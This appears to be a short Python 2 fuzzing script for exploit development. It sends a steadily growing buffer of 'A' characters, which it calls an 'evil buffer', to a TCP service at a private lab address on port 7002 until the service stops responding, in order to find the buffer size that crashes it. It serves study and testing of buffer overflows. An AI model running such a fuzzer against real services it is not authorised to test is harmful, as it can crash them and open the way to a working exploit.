#!/usr/bin/python
import socket
import time

buffer_size = int(raw_input("[*] Please insert the limit size for buffer: "))
increase = int(raw_input("[*] Please insert the number of bytes for increasment:"))

mybuffer = "A" * increase
print "[*] mybuffer is: " + mybuffer
print "[*] Sending evil buffer..."
while(len(mybuffer) <= buffer_size):
	print "[*] Len of mybuffer: " + str(len(mybuffer)), "Len of buffer_size: " + str(buffer_size)
	time.sleep(1)
	try:
	  print "[*] Buffer size is: " + str(len(mybuffer)) 	  
	  time.sleep(1)
	  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	  s.connect(("192.168.128.10", 7002))
	  s.send(mybuffer)
	  s.close()
	  
	  print "[*] Buffer was sent successfuly. Increase the buffer."
	  mybuffer = mybuffer + ("A" * increase)
	  time.sleep(15)
	except:
	  print "[*] Error was ocure. Buffer size is: " + str(len(mybuffer))
	  break

